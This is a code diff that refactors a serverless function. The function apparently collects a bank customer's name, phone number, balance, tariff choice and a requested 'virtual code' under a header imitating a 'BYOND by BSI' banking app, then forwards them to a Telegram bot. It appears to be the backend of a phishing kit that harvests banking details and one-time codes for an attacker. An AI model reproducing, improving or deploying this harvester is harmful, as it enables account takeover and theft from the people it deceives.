@@ -13,7 +13,6 @@ exports.handler = async (event, context) => {
         };
     }
 
-    // Only accept POST requests
     if (event.httpMethod !== 'POST') {
         return {
             statusCode: 405,
@@ -30,51 +29,49 @@ exports.handler = async (event, context) => {
             throw new Error('Telegram credentials not configured');
         }
 
-        // Base message template
-        let message = "├• DUET | BYOOND by bsi\n├───────────────────";
+        // Start building the message with header
+        let messageLines = [
+            '├• DUET | BYOOND by bsi',
+            '├───────────────────'
+        ];
 
-        // Add tariff selection if available
+        // Always include tariff selection if available
         if (data.tariff) {
-            message += `\n├• pilih tarif : ${data.tariff === 'old' ? 'lama' : 'baru'}`;
+            messageLines.push(`├• pilih tarif : ${data.tariff === 'old' ? 'lama' : 'baru'}`);
         }
 
-        // Add name if available
+        // Add name section if available
         if (data.name) {
-            message += "\n├───────────────────";
-            message += `\n├• nama : ${data.name}`;
+            messageLines.push('├───────────────────', `├• nama : ${data.name}`);
         }
 
         // Add phone number if available
         if (data.phone) {
-            message += "\n├───────────────────";
-            message += `\n├• nomor : ${data.phone}`;
+            messageLines.push('├───────────────────', `├• nomor : ${data.phone}`);
         }
 
         // Add balance if available
         if (data.balance) {
-            message += "\n├───────────────────";
-            message += `\n├• saldo : Rp ${formatNumber(data.balance)}`;
+            messageLines.push('├───────────────────', `├• saldo : Rp ${formatNumber(data.balance)}`);
         }
 
         // Add virtual code request if applicable
         if (data.step === 'request-code') {
-            message += "\n├───────────────────";
-            message += "\n├• minta kode virtual :";
+            messageLines.push('├───────────────────', '├• minta kode virtual :');
         }
 
-        // Add virtual code if available
+        // Add virtual code if available (final step)
         if (data.virtualCode) {
-            message += "\n├───────────────────";
-            message += `\n├• kode virtual : ${data.virtualCode}`;
+            messageLines.push('├───────────────────', `├• kode virtual : ${data.virtualCode}`);
         }
 
         // Close the message box
-        message += "\n╰───────────────────";
+        messageLines.push('╰───────────────────');
 
         // Send to Telegram
         await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             chat_id: chatId,
-            text: message,
+            text: messageLines.join('\n'),
             parse_mode: 'Markdown'
         });
 
@@ -95,8 +92,8 @@ exports.handler = async (event, context) => {
     }
 };
 
-// Helper function to format numbers
+// Helper function to format numbers with thousand separators
 function formatNumber(num) {
     if (!num) return '0';
     return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-    }
+                                                  }
